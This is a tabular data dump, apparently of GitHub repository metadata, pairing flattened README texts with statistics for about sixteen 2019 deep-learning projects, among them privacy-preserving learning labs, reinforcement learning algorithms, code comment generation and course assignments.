tjwei,NCTU_Private_DeepLearning,n/a,NCTUPrivateDeepLearning Labs Week 1 https github com tjwei NCTUPrivateDeepLearning blob master Week1DifferentialPrivacy ipynb Form https docs google com forms d e 1FAIpQLScuKYsTlCoiGC s4crW5Xexr4Gv543P KSdOWBCqcMgjUhUAQ viewform Week 2 Task 1 Using tensorflow privacy to train mnist Task 2 Secret Sharing Form https docs google com forms d e 1FAIpQLSdgta uQC60yyTVnbVsKmM2sZhuLCiA2eX2kfX 3gzFIXLjA viewform Resources My slides https docs google com presentation d 1J76Wx3dgwJsiBjqaBfmm4vKk WRpXYA0ZQRZWZha0Kw edit usp sharing Pysft https github com OpenMined PySyft TF Privacy https github com tensorflow privacy Goolge differential privacy https github com google differential privacy Book https www cis upenn edu aaroth Papers privacybook pdf Udacity course repo https github com udacity private ai,2019-09-11T10:44:09Z,2019-10-22T17:19:29Z,Jupyter Notebook,tjwei,User,1,5,1,11,master,tjwei,1,0,0,0,0,0,0
dark-ai,pypytorch,autograd#deep-learning#dynamic-networks#machine-learning#python3#tensor,PyPyTorch Logo assets imgs pypytorch logo png PyPyTorch is a simple deep learning framework implemented by Python3 Contents Introduction introduction Installation installation PyPI pypi From Source from source TODO todo Introduction PyPyTorch is very similar to PyTorch most of APIs are the same as PyTorch at this stage this framework enables us to understand how dynamic neural network works If you master PyTorch you can master PyPyTorch in a short time There are some important and core modules in PyPyTorch By the way you can call its nickname PPT for short Module Description pypytorch The entry of PyPyTorch framework once you import pypytorch you can work everything with PyPyTorch data Privides dataset dataloader and transforms functions A operator library for Tensor object in PyPyTorch nn A high level neural network library in PyPyTorch which built on functions module you can build a neural network model very fast with the help of nn optim There are some optimizers including SGD Adam and so on pypytorch run mnist assets gifs pypytorch run mnist gif Download the mnist zip dataset at link BaiduNetDisk https pan baidu com s 1bfUBrjVqkHuunh4IsYW9EQ then unzip it to examples data if examples data doesn t exist you need create directory example data by yourself The full path of mnist dataset is examples data mnist Besides you can change configuration at examples scripts mnist config py Installation PyPI 1 pip install pypytorch As for Windows user I recommend you to use Miniconda From Source 1 git clone https github com dark ai pypytorch git pypython 2 cd pypytorch 3 pip3 install r requirements txt 4 make install make clean Docker 1 docker pull docker io pypytorch 2 docker run it pypytorch TODO x SGD Optimizer x Adam Optimizer Adam implemented by me sucks x Sequential x ReLU x BatchNorm DeConv2d Waiting to test Upsample,2019-08-11T08:47:41Z,2019-11-24T10:54:53Z,Python,dark-ai,User,1,5,2,72,master,dark-ai,1,0,1,0,1,0,0
vicgalle,samsi-deep-learning,deep-learning#pytorch#tutorial,samsi deep learning Practical materials for the Deep Learning course at SAMSI Duke UNC NC State using the PyTorch DL framework Installation Make sure you have a working Python 3 environment We recommend you to use Anaconda https www anaconda com distribution After that you need to install PyTorch This course is based on PyTorch 1 2 which is the most stable version at the time of this writing You can install from here https pytorch org Topics 1 An introduction to the pytorch framework What does it have to offer compared to numpy etc notebook https github com vicgalle samsi deep learning blob master 1introtopytorch ipynb 2 A basic logistic regression and multilayer perceptron for the MNIST dataset notebook https github com vicgalle samsi deep learning blob master 2mnist ipynb 3 Intro to NLP using torchtext the IMDB dataset and both an LSTM network and a Transformer notebook https github com vicgalle samsi deep learning blob master 3rnnimdb ipynb 4 Intro to adversarial examples attacking a convolutional network notebook https github com vicgalle samsi deep learning blob master 4cnnadversarial ipynb 5 Intro to generative adversarial networks using the MNIST dataset notebook https github com vicgalle samsi deep learning blob master 5introgans full ipynb Contact Should you have any questions or problems open an issue or email Victor Gallego https vicgalle github io victor gallego icmat es or Roi Naveiro https roinaveiro github io roi naveiro icmat es,2019-09-03T17:15:15Z,2019-11-12T03:18:07Z,Jupyter Notebook,vicgalle,User,2,5,1,40,master,vicgalle#roinaveiro,2,0,0,0,0,0,1
jesusmartinoza,Open-eyes-using-Pix2Pix,n/a,Open eyes using Deep Learning WIP Have you ever had the perfect picture but closed your eyes It is a very common issue you can fix it by going to Photoshop and editing the picture there But why not let an AI to do the hard work for us Demo You can find a demo in the following link Overflow ai https overflow ai open eyes using pix2pix https github com jesusmartinoza Open eyes using Pix2Pix blob master assets demo1 png raw true Motivation The idea of this project had been in my head for a long time I couldn t find the time to carry it out Then the Youtuber DotCSV https www youtube com channel UCy5znSnfMsDwaLlROnZ7Qbg launched the challenge RetoDotCSV2080Super https www youtube com watch v BNgAaCK920E where you have to build a project using Pix2Pix model So perfect timing to start to code Dataset This was the first big challenge As you may know there is no dataset for people with open and closed eyes The dataset Closed Eyes In The Wild CEW is very useful but does not have a data labeled by person with open closed eyes So what I propose is to generate the dataset manually with the help of OpenCV Basically I take a picture from CEW dataset and overlay on it the eyes of a random photo of the UTKFace dataset Then I manually clean the patches using Photoshop I did this process several times until I achieved a final dataset of 48 samples https github com jesusmartinoza Open eyes using Pix2Pix blob master assets trainingprocess png raw true Training process GIF From FacePatcher image to hopefully Photoshop level https github com jesusmartinoza Open eyes using Pix2Pix blob master assets process gif raw true Results Future work and improvements In order to achieve better accuracy it is necessary to increase the dataset samples and this way try with more interesting approaches to solve the task Currently the output of the app is a 256x256 picture The output is only for the face so a nice thing to do would be to overlay the result on the original photo Author Developed by Jess Alberto Martnez Mendoza Dataset credits UTKFace dataset Authors Zhang Zhifei Song Yang and Qi Hairong https susanqq github io UTKFace Closed Eyes In The Wild CEW F Song X Tan X Liu and S Chen Eyes Closeness Detection from Still Images with Multi scale Histograms of Principal Oriented Gradients Pattern Recognition 2014 License The MIT License MIT Copyright c 2018 Jess Alberto Martnez Mendoza jesusmartinoza Permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files the Software to deal in the Software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense and or sell copies of the Software and to permit persons to whom the Software is furnished to do so subject to the following conditions The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software THE SOFTWARE IS PROVIDED AS IS WITHOUT WARRANTY OF ANY KIND EXPRESS OR IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE,2019-08-28T17:00:00Z,2019-10-30T17:54:42Z,Jupyter Notebook,jesusmartinoza,User,1,5,3,52,master,jesusmartinoza,1,0,0,0,0,0,0
Josh-Payne,deep-hyperedges,deep-learning#graphs#hyperedge-embedding#hypergraphs#node-embedding#random-walk,Deep Hyperedges Update 09 30 19 repository is now public This repository implements the hypergraph learning techniques introduced in Deep Hyperedges A Framework for Transductive and Inductive Learning on Hypergraphs to be presented in December at the Sets Partitions Workshop at the 33rd Conference on Neural Information Processing Systems NeurIPS 2019 This is a very important and exciting problem so we re encouraging collaboration here Work on this particular framework is still very much in an active state HypergraphWalks py This file implements the SubsampleAndTraverse and TraverseAndSelect random walk procedures with constant or inverse switching probabilities Models py This file implements the three models discussed DeepHyperedges which combines knowledge from both random walk procedures MLP which is a neural network used to classify the hyperedge embeddings from TraverseAndSelect and DeepSets which is used to classify sets of vertex embeddings from SubsampleAndTraverse Embeddings py This file implements Word2Vec using gensim to create embeddings for the random walks Each of the Jupyter notebooks implement the experiments performed for the five datasets tested on For each dataset create the following file structure logs deephyperedgeslogs deepsetslogs MLPlogs weights data e g cora corum disgenet meetups pubmed These names are used in the notebooks In the data directory put the appropriate data from the following sources Cora CS publication citation network dataset https relational fit cvut cz dataset CORA Vertices are papers and hyperedges are the cited works of a given paper so its 1 neighborhood A bit contrived I know but we do see a performance increase over the graph structure by itself Each paper and thus each hyperedge is classified into one of seven classes based on topic CORUM protein complex dataset https mips helmholtz muenchen de corum download Vertices are proteins and hyperedges are collections of proteins Each hyperedge is labeled based on whether or not the collection forms a protein complex Negative examples are generated in the notebook DisGeNet disease genomics dataset http www disgenet org downloads Vertices are genes and hyperedges are diseases Each disease is classified into one of 23 MeSH codes if it has multiple we randomly select one Meetups social networking dataset https www kaggle com sirpunch meetups data from meetupcom Vertices are members and hyperedges are meetup events Each meetup event is classified into one of 36 types We also experiment with combining the two largest Tech and Career Business into one class and all others into another class to give a balanced dataset PubMed diabetes publication citation network dataset https linqs soe ucsc edu data Vertices are papers and hyperedges are the cited works of a given paper Again a bit contrived but there are more baselines to compare with since there s an underlying directed graph structure and a large body of work which studies deep learning on graphs Each paper and thus each hyperedge is classified into one of three classes based on the type of diabetes it studies,2019-08-23T23:10:54Z,2019-12-04T06:42:23Z,Jupyter Notebook,Josh-Payne,User,1,5,1,17,master,Josh-Payne,1,0,0,0,0,0,0
drimpossible,Sampling-Bias-Active-Learning,n/a,Sampling Bias Active Learning This repository contains the code for our EMNLP 19 paper Sampling Bias in Deep Active Classification An Empirical Study https arxiv org pdf 1909 09389 pdf Ameya Prabhu https drimpossible github io Charles Dognin https www linkedin com in charlesdognin and Maneesh Singh https www linkedin com in maneesh singh 3523ab9 Authors contributed equally Citation If you find our work useful in your research please consider citing miscprabhu2019sampling title Sampling Bias in Deep Active Classification An Empirical Study author Ameya Prabhu and Charles Dognin and Maneesh Singh year 2019 eprint 1909 09389 archivePrefix arXiv primaryClass cs CL Introduction The exploding cost and time needed for data labeling and model training are bottlenecks for training DNN models on large datasets Identifying smaller representative data samples with strategies like active learning can help mitigate such bottlenecks Previous works on active learning in NLP identify the problem of sampling bias in the samples acquired by uncertainty based querying and develop costly approaches to address it Using a large empirical study we demonstrate that active set selection using the posterior entropy of deep models like FastText zip FTZ is robust to sampling biases and to various algorithmic choices query size and strategies unlike that suggested by traditional literature We also show that FTZ based query strategy produces sample sets similar to those from more sophisticated approaches e g ensemble networks Finally we show the effectiveness of the selected samples by creating tiny high quality datasets and utilizing them for fast and cheap training of large models Based on the above we propose a simple baseline for deep active text classification that outperforms the state of the art We expect the presented work to be useful and informative for dataset compression and for problems involving active semi supervised or online learning scenarios Installation and Dependencies Install all requirements required to run the code by Activate a new virtual environment pip install r requirements txt Usage Step 1 To train a model with our AL framework please use cd src python main py Your arguments In particular you can choose dataset The dataset among the 8 available in our paper model the model FastText or Multinomial Bayes You can also choose all the hyperparameters of your model as well as many active learning related hyperparameters acquisition function number of initial data points number of points queries at each iterations For a comprehensive list of arguments please look at the opts py function Step 2 To replicate our results with your logs or our logs please use computeintersection py dataset DATASET logsdir PATHTOLOGS model MODEL sameseed BOOL difseed BOOL computeintersectionsupport py dataset DATASET logsdir PATHTOLOGS model MODEL sameseed BOOL difseed BOOL computelabelentropy py dataset DATASET logsdir PATHTOLOGS model MODEL sameseed BOOL difseed BOOL Step 3 To run the ULMFiT model on the resulting dataset please use the original repository https github com fastai fastai tree master courses dl2 imdbscripts Reproducing the results Step 1 Download all datasets for the main study experiments bash downloaddatasets sh Code is present in src folder To reproduce all experimental results python generateallexperiments py exp sh bash exp sh This will produce some bash files Run all of them parallely sequentially to reproduce all experiments as in the paper Contact If facing any problem with the code please open an issue here Please email for any questions comments suggestions regarding the paper to us on ameya prabhu mailfence com and charles dognin verisk com Thanks,2019-08-15T16:41:37Z,2019-11-28T16:25:34Z,Python,drimpossible,User,1,5,0,5,master,cdcsai,1,0,0,0,0,0,0
DatomicsGroup,deepbio,bioinformatics#bioinformatics-algorithms#biology#biomedicine#computational-biology#deep-learning#deep-learning-papers#deep-neural-networks#deeplearning#deeplearning-papers#genomics#machine-learning#neural-nets#neural-networks#papers#tutorials,Deep Learning for Biomedicine This is a curated list of tutorials projects libraries videos papers books and anything related to applications of Deep Learning to biomedicine Feel free to make a pull request to contribute to this list Table of contents Courses courses Tutorials Presentations tutorials Projects projects Libraries libraries PyTorch pytorch TensorFlow tensorflow Publications publications Courses Deep Learning in Genomics and Biomedicine https canvas stanford edu courses 51037 Tutorials Presentations Interactive tutorial to build a convolutional neural network to discover DNA binding motifs https colab research google com drive 17E4h5aAOioh5DiTo7MZg4hpL6Z0FyWr Martin Preusse Gkcen Eraslan Deep modeling of DNA sequences with Python Keras PyMunich 2016 https www youtube com watch v 0Zuqytgf6yY James Zou Deep learning for genomics Introduction and examples Computational Genomics Summer Institute 2017 https www youtube com watch v JYt1IqdDAPc Cory McLean Nucleus TensorFlow toolkit for Genomics TensorFlow Dev Summit 2018 https www youtube com watch v 7wi9NdGh9oI Lee Cooper Predicting Cancer Outcomes from Genomics and Histology with Deep Learning NCI Webinars 2018 https www youtube com watch v Xrvcs3zEis William Noble Machine learning methods for making sense of big genomic data Computational Genomics Winter Institute 2018 https www youtube com watch v JzSf5AU9VVc Avanti Shrikumar Not Just a Black Box Interpretable Deep Learning for Genomics and Beyond NVIDIA GTC 2018 https www youtube com watch v T8AMLwmyvQ Olga Troyanskaya The Science of Deep Learning National Academy of Sciences Arthur M Sackler Colloquium 2019 https www youtube com watch v 94B8zGsFJE Peter Koo Interpretable convolutional networks for regulatory genomics Models Inference and Algorithms Meeting 2019 https www youtube com watch v nQqVxGzeYZs Projects Kipoi Model Zoo for Genomics https kipoi org Libraries PyTorch Selene 2019 03 Selene a PyTorch based deep learning library for sequence data Kathleen M Chen Evan M Cofer Jian Zhou Olga G Troyanskaya Nature Methods https www nature com articles s41592 019 0360 8 http selene flatironinstitute org https github com FunctionLab selene TensorFlow Pysster 2018 09 pysster classification of biological sequences by learning sequence and structure motifs with convolutional neural networks Stefan Budach Annalisa Marsico Bioinformatics https academic oup com bioinformatics article 34 17 3035 4962494 https github com budach pysster DragoNN https kundajelab github io dragonn https github com kundajelab dragonn Publications https github com achursov deepbio blob master publications md,2019-08-14T00:01:27Z,2019-12-14T03:00:23Z,n/a,DatomicsGroup,Organization,2,5,0,59,master,achursov,1,0,0,0,0,0,0
banctilrobitaille,kerosene,ai#artificial-intelligence#deeplearning#framework#python#pytorch#visdom,Kerosene Deep Learning framework for fast and clean research development with Pytorch see the doc for more details https kerosene readthedocs io en latest MNIST Example Here is a simple example that shows how easy and clean it is to train a simple network In very few lines of code the model is trained using mixed precision and you got Visdom Console logging automatically See full example there MNIST Kerosene https github com banctilrobitaille kerosene mnist python if name main logging basicConfig level logging INFO CONFIGFILEPATH config yml modeltrainerconfig trainingconfig YamlConfigurationParser parse CONFIGFILEPATH trainloader DataLoader torchvision datasets MNIST files train True download True transform Compose ToTensor Normalize 0 1307 0 3081 batchsize trainingconfig batchsizetrain shuffle True testloader DataLoader torchvision datasets MNIST files train False download True transform Compose ToTensor Normalize 0 1307 0 3081 batchsize trainingconfig batchsizevalid shuffle True Initialize the loggers visdomlogger VisdomLogger VisdomConfiguration fromyml CONFIGFILEPATH Initialize the model trainers modeltrainer ModelTrainerFactory model SimpleNet create modeltrainerconfig RunConfiguration useamp False Train with the training strategy trainer SimpleTrainer MNIST Trainer trainloader testloader modeltrainer witheventhandler PrintTrainingStatus every 100 Event ONBATCHEND witheventhandler PrintModelTrainersStatus every 100 Event ONBATCHEND witheventhandler PlotAllModelStateVariables visdomlogger Event ONEPOCHEND witheventhandler PlotGradientFlow visdomlogger every 100 Event ONTRAINBATCHEND train trainingconfig nbepochs Contributing How to contribute X Create a branch by feature and or bug fix X Get the code X Commit and push X Create a pull request Branch naming Feature branch feature Short feature description Issue number Bug branch fix Short fix description Issue number Commits syntax Adding code Added Short Description Issue Number Deleting code Deleted Short Description Issue Number Modifying code Changed Short Description Issue Number Merging code Y Merged Short Description Issue Number Icons made by Freepik from www flaticon com is licensed by CC 3 0 BY,2019-08-12T20:16:49Z,2019-12-06T19:58:59Z,Python,banctilrobitaille,User,1,5,0,223,master,banctilrobitaille#pldelisle,2,1,1,13,15,4,48
DoubangoTelecom,ultimateMRZ-SDK,n/a,Preview version for Windows is at https github com DoubangoTelecom ultimateMRZ SDK tree master preview Technical questions Please check our discussion group https groups google com forum forum doubango ai or twitter account https twitter com doubangotelecom lang en,2019-09-12T11:31:55Z,2019-12-07T22:40:42Z,C,DoubangoTelecom,User,3,5,1,2,master,DoubangoTelecom,1,0,0,1,0,0,0
lucifer2859,Paillier-LWE-based-PHE,n/a,Paillier LWE based PHE Privacy Preserving Deep Learning via Additively Homomorphic Encryption CUDA9 09 1 PyTorch 1 1 0 python paillier master python setup py test python test py LWE based PHE mkdir key python cputest py python cudatest py python splitdata py LeNet mkdir models LeNet pyLeNetsubset pyjointlylearningdemo py jointlylearningwithencryptiondemo pyimport LeNetcudatestLeNet pyLWE based PHE jointlylearning v1 IID v2 IID v3 IIDepochiteration v4 v3Non IID federatedlearning v1 FedAvg v2 EASGD Elastic Averaging SGD v3 FedProx,2019-08-25T06:57:52Z,2019-10-08T03:01:19Z,Python,lucifer2859,User,1,5,1,72,master,lucifer2859,1,0,0,0,0,0,0
paintception,Deep-Quality-Value-Family-,atari-2600#ddqn-framework#deep-reinforcement-learning#dqn-variants#dqv#dqv-max#keras-tensorflow,A new family of Deep Reinforcement Learning algorithms DQV Dueling DQV and DQV Max Learning This repo contains the code that releases a new family of Deep Reinforcement Learning DRL algorithms The aim of these algorithms is to learn an approximation of the state value V s function alongside an approximation of the state action value Q s a function Both approximations learn from each others estimates therefore yielding faster and more robust training This work is an in depth extension of our original DQV Learning https arxiv org abs 1810 00368 paper and will be presented in December at the coming NeurIPS Deep Reinforcement Learning DRLW Workshop in Vancouver Canada An in depth presentation of the several benefits that these algorithms provide are discussed in our new paper Approximating two value functions instead of one towards characterizing a new family of Deep Reinforcement Learning Algorithms Be sure to check out Arxiv for a pre print https arxiv org abs 1909 01779 of our work The main algorithms presented in this repo are Dueling Deep Quality Value Dueling DQV Learning This Repo Deep Quality Value Max DQV Max Learning This Repo Deep Quality Value DQV Learning originally presented in DQV Learning https github com paintception Deep Quality Value DQV Learning is now properly refactored while we also release implementations of Deep Q Learning DQN https arxiv org abs 1312 5602 Double Deep Q Learning DDQN https arxiv org abs 1509 06461 which have been used for all the experimental comparisons presented in our work alt text https github com paintception Deep Quality Value Family blob master figures dqvmaxpong jpg alt text https github com paintception Deep Quality Value Family blob master figures dqvmaxenduro jpg If you aim to train an agent from scratch on a game of the Atari Arcade Learning benchmark ALE run the trainingjob sh script it allows you to choose which type of agent to train according to the type of policy learning it uses online for DQV and Dueling DQV while offline for all other algorithms In models we release the trained models obtained on the three main games of the ALE which have been presented in our paper We release weights for both DQV and DQV Max You can use these models to explore the behavior of the learned value functions with the src testvaluefunctions py script The script will compute the averaged expected return of all visited states and show that the algorithms of the DQV family suffer less from the overestimation bias of the Q function The script will also show that our algorithms do not overestimate the V function instead of the Q function alt text https github com paintception Deep Quality Value Family blob master figures DQV Maxestimates png We are currently benchmarking our algorithms on as many games of the Atari benchmark as possible src DQVFULLATARI sh,2019-08-12T11:53:11Z,2019-11-30T09:26:10Z,Python,paintception,User,1,5,1,50,master,paintception,1,0,0,0,1,0,0
Jopepato,DogSpotting,n/a,DogSpotting API created using Flask It will allow the user to send an url of a dog image and will return the number and positions of the dogs within the image Built with imageai Install Download the weights for the neural network here https github com OlafenwaMoses ImageAI releases download 1 0 yolo h5 And place them in this project folder Run the docker compose file to install all the dependencies and create the build docker compose up build d It will install all the dependencies for python and start the service in the port 80 With the d flag we will indicate it to run in the background Usage Send the url of a dog image in a json request with the method POST It will return the number an array of the dogs within the image It will have to be requested in the predict route Example Using the following image dogs images dogs jpg We will just send the following json to our api using the url of the image jsonToSend images exampleJSON png And will return us the response with the dogs within the image responseJSON images returnJSON png Example in jupyter notebook and questions answered An example for several images of dogs can be seen in a Jupyter notebook in the folder jupyterExample As well as the answers to the questions asked Credits Implemented with the detection library imageai,2019-09-16T13:10:23Z,2019-10-03T11:14:57Z,HTML,Jopepato,User,1,5,0,14,master,Jopepato,1,0,0,0,0,0,1
LRNavin,AutoComments,n/a,AutoComments pencil2 Description Motivation We want to create a deep Neural Network that can automatically generate comments for code snippets passed to it The motivation behind this is that in software development and maintenance developers spend around 59 of their time on program comprehension activities Having comments that are generated automatically will hopefully cut this time down In order to do this we will combine the recent paper Code2Vec Learning Distributed Representations of Code https openreview net pdf id H1gKYo09tX by Alon et al with the paper Deep Code Comment Generation https ink library smu edu sg cgi viewcontent cgi article 5295 context sisresearch by X Hu et al so as to make a better performing model using the newer Code2Vec encoding that was not used in the Deep Code Comment Generation paper Work done In this project 2 experiments were conducted For the first one we used the Code2Seq code to create model which will generate comments for code snippets functions of Java instead of the function names For the second one we repeated the procedure followed in the first experiment with modified ASTs In particular we added the precific name of each variable to the AST in order to make the comments generated more descriptive The evaluation of the experiments were conducted in terms of BLEU 4 score The performance of the first experiment was poor BLEU 4 score 6 08 while with the novelty introduced in the second experiment we achieved an important improvement BLEU 4 score 10 08 However the performance achieved was much worse than the one achieved by X HU BLEU 4 score 38 17 in Deep Code Comment Generation paper because our model was not able to produce long comments Nevertheless it predicted succesfully the shorter comments as well as a part of the long ones The reason for this behavior is that the Code2Seq was built to produce function names which are short and not long sequences All in all an important main conclusion we can draw regarding our best model is that with the novelty introduced with the variable names in the AST it is capable of understanding the syntactic and semantic meaning of Java code regarding the automatic comment generation However suffers from the incapability to generate longer comments and complete pagefacingup Dataset The dataset that we used is the same dataset used by the Deep Code Comment Generation paper this is a dataset of more than 500 000 code snippets including comments This also gave us a baseline against which to compare The dataset can be found here https github com xing hu DeepCom scroll System Overview The pipeline of the system is 1 Extract the ASTs from the code snippets comment pairs 2 Use the extracted ASTs to train the model 3 Test the trained model on the test data The high level pipeline is shown in the following image triangularruler Network Architecture The Encoder Decoder architecture of this project is shown in the image below and is influenced by the work https openreview net pdf id H1gKYo09tX of U Alon et al barchart Results The BLEU 4 score achieved in the test dataset is presented below Approaches BLEU 4 DeepCom 38 17 Method 1 6 08 Method 2 10 02 For more information about the results and a detailed description of the 2 methods used please feel free to take a look at our project report https github com LRNavin AutoComments tree master report ML4SEgroup3report pdf that is included on this repository office Project Structure The structure of the project is JavaExtractor https github com LRNavin AutoComments tree master data JavaExtractor This directory contains the necessary code for exctracting the ASTs from the dataset code2seqmaster https github com LRNavin AutoComments tree master code2seqmaster This directory contains the original Code2Seq code data https github com LRNavin AutoComments tree master data here you can find a small portion of the data we used We couldn t upload the whole dataset because of its size preproc https github com LRNavin AutoComments tree master preproc Conatins all the necessary ptython files and neccesary scripts for the preprocessing and the proper execution of the AST extraction report https github com LRNavin AutoComments tree master report Contains the report for this project and its latex code scripts https github com LRNavin AutoComments tree master scripts Contains all the extra scripts used like the perl script for the BLEU score extraction bleu py https github com LRNavin AutoComments tree master bleu py Extracts the BLEU 4 score for a reference and a prediction file Papers Code2Vec Learning Distributed Representations of Code https openreview net pdf id H1gKYo09tX Deep Code Comment Generation https ink library smu edu sg cgi viewcontent cgi article 5295 context sisresearch bustsinsilhouette Group 3 Team Members Rafail Skoulos https github com RafailSkoulos17 Navin Raj Prabhu https github com LRNavin Thomas Pfann https github com ThomasPf Jonathan Katzy https github com jkatzy,2019-09-11T10:25:32Z,2019-12-02T01:44:17Z,Python,LRNavin,User,4,5,2,44,master,RafailSkoulos17#LRNavin#ThomasPf,3,0,0,1,0,1,0
BhushanGarware,DeepLearningWokshop,n/a,DeepLearningWokshop Prerequisites Anaconda with Python 3 6 or above Seaborn Installing Follow the instuctions given on ANACONDA https www continuum io downloads installation How to run the notebooks Download the package to the local directory Open Anaconda prompt and go to the path of the downloaded package Then type following commands at the path pip install keras 2 1 6 pip install tensorflow 1 7 0 conda install scikit learn pip install opencv contrib python Acknowledgments,2019-08-21T19:34:56Z,2019-09-11T12:15:18Z,Jupyter Notebook,BhushanGarware,User,1,4,2,17,master,BhushanGarware,1,0,0,0,0,0,0
blmayer,deep,machine-learning#neural-networks#r,deep A small R library for creating deep neural networks Note to contributors This project is in a very initial state and many features are missing new layers like dropout pooling convolution etc a better implementation of the backpropagation algorithm new training algorithms a plot method tho view all neurons and weights in a nice way a plot during training just because it s nice anything you propose that makes sense I intend to convert some methods using RCPP for better performance,2019-09-14T23:00:51Z,2019-11-01T14:22:27Z,R,blmayer,User,1,4,0,22,master,blmayer,1,0,0,0,0,0,0
keenborder786,Deep-Learning-Coursera,n/a,Deep Learning Coursera Deep Learning Specialization by Andrew Ng Instructor Andrew Ng http www andrewng org Introduction This repo contains all my work for this specialization All the code base screenshot and images are taken from unless specified Deep Learning Specialization on Coursera https www coursera org specializations deep learning Programming Assignments Course 1 Neural Networks and Deep Learning Week 2 PA 1 Logistic Regression with a Neural Network mindset https github com keenborder786 Deep Learning Coursera blob master Neural 20Networks 20and 20Deep 20Learning Week 2 Logistic 20Regression 20with 20a 20Neural 20Network 20mindset 20v5 ipynb Week 3 PA 1 Planar dataclassificationwithonehiddenlayer https github com keenborder786 Deep Learning Coursera blob master Neural 20Networks 20and 20Deep 20Learning Week 3 Planardataclassificationwithonehiddenlayerv6b ipynb Week 4 PA 1 Building your Deep Neural Network Step by Step v8 https github com keenborder786 Deep Learning Coursera blob master Neural 20Networks 20and 20Deep 20Learning Week 4 Building 2Byour 2BDeep 2BNeural 2BNetwork 2B 2BStep 2Bby 2BStep 2Bv8 ipynb Week4 PA 2 Deep Neural Network Application v8 https github com keenborder786 Deep Learning Coursera blob master Neural 20Networks 20and 20Deep 20Learning Week 4 Deep 2BNeural 2BNetwork 2B 2BApplication 2Bv8 ipynb Course 2 Improving Deep Neural Networks Hyperparameter tuning Regularization and Optimization Week 1 PA 1 Gradient Checking https github com keenborder786 Deep Learning Coursera blob master Improving 20Deep 20Neural 20Networks 20Hyperparameter 20tuning 2C 20Regularization 20and 20Optimization Week 1 Gradient 2BChecking 2Bv1 ipynb Week 1 PA 2 Initialization https github com keenborder786 Deep Learning Coursera blob master Improving 20Deep 20Neural 20Networks 20Hyperparameter 20tuning 2C 20Regularization 20and 20Optimization Week 1 Initialization ipynb Week 2 PA 1 Optimization methods https github com keenborder786 Deep Learning Coursera blob master Improving 20Deep 20Neural 20Networks 20Hyperparameter 20tuning 2C 20Regularization 20and 20Optimization Week 2 Optimization 2Bmethods ipynb Week 1 PA 3 Regularization https github com keenborder786 Deep Learning Coursera blob master Improving 20Deep 20Neural 20Networks 20Hyperparameter 20tuning 2C 20Regularization 20and 20Optimization Week 1 Regularization 2B 2Bv2 ipynb Week 3 PA 1 Tensorflow Tutorial https github com keenborder786 Deep Learning Coursera blob master Improving 20Deep 20Neural 20Networks 20Hyperparameter 20tuning 2C 20Regularization 20and 20Optimization Week 3 Tensorflow 2BTutorial 2Bv3a ipynb Course 4 Convolutional Neural Networks Week 1 PA 1 Convolutional Model step by step https github com keenborder786 Deep Learning Coursera blob master Convolutional 20Neural 20Networks Week 1 Convolution 2Bmodel 2B 2BStep 2Bby 2BStep 2B 2Bv2 ipynb Week 1 PA 2 Convolutional Neural Networks Application https github com keenborder786 Deep Learning Coursera blob master Convolutional 20Neural 20Networks Week 1 Convolution 2Bmodel 2B 2BApplication 2B 2Bv1 ipynb Week 2 PA 1 Keras Tutorial Happy House https github com keenborder786 Deep Learning Coursera blob master Convolutional 20Neural 20Networks Week 2 Keras 2B 2BTutorial 2B 2BHappy 2BHouse 2Bv2 ipynb Week 2 PA 2 Residual Networks https github com keenborder786 Deep Learning Coursera blob master Convolutional 20Neural 20Networks Week 2 Residual 2BNetworks 2B 2Bv2 ipynb Week 3 PA 1 Autonomous driving application Car detection v3 https github com keenborder786 Deep Learning Coursera blob master Convolutional 20Neural 20Networks Week 3 Autonomous 2Bdriving 2Bapplication 2B 2BCar 2Bdetection 2B 2Bv3 ipynb Week 4 PA 1 Art Generation with Neural Style Transfer v2 https github com keenborder786 Deep Learning Coursera blob master Convolutional 20Neural 20Networks Week 4 Art 2BGeneration 2Bwith 2BNeural 2BStyle 2BTransfer 2B 2Bv2 ipynb Week4 PA 2 Face Recognition for the Happy House v3 https github com keenborder786 Deep Learning Coursera blob master Convolutional 20Neural 20Networks Week 4 Face 2BRecognition 2Bfor 2Bthe 2BHappy 2BHouse 2B 2Bv3 ipynb Course 5 Sequence Models Week 1 PA 1 Building a Recurrent Neural Network Step by Step v3 https github com keenborder786 Deep Learning Coursera blob master Sequence 20Models Week 201 Building 2Ba 2BRecurrent 2BNeural 2BNetwork 2B 2BStep 2Bby 2BStep 2B 2Bv3 ipynb Week 1 PA 2 Dinosaurus Island Character level language model final v3 https github com keenborder786 Deep Learning Coursera blob master Sequence 20Models Week 201 Dinosaurus 2BIsland 2B 2BCharacter 2Blevel 2Blanguage 2Bmodel 2Bfinal 2B 2Bv3 ipynb Week 1 PA 3 Improvise a Jazz Solo with an LSTM Network v3 https github com keenborder786 Deep Learning Coursera blob master Sequence 20Models Week 201 Improvise 2Ba 2BJazz 2BSolo 2Bwith 2Ban 2BLSTM 2BNetwork 2B 2Bv3 ipynb Week 2 PA 1 Operations on word vectors v2 https github com keenborder786 Deep Learning Coursera blob master Sequence 20Models Week 202 Operations 2Bon 2Bword 2Bvectors 2B 2Bv2 ipynb Week 2 PA 2 Emojify v2 https github com keenborder786 Deep Learning Coursera blob master Sequence 20Models Week 202 Emojify 2B 2Bv2 ipynb Week 3 PA 1 Neural machine translation with attention v2 https github com keenborder786 Deep Learning Coursera blob master Sequence 20Models Week 203 Neural 20machine 20translation 20with 20attention 20 20v2 ipynb Week 3 PA 2 Trigger word detection v1 https github com keenborder786 Deep Learning Coursera blob master Sequence 20Models Week 203 Trigger 20word 20detection 20 20v1 ipynb Done Yeapeeeee,2019-08-15T21:13:37Z,2019-11-02T21:23:03Z,Jupyter Notebook,keenborder786,User,1,4,2,43,master,keenborder786,1,0,0,0,0,0,0
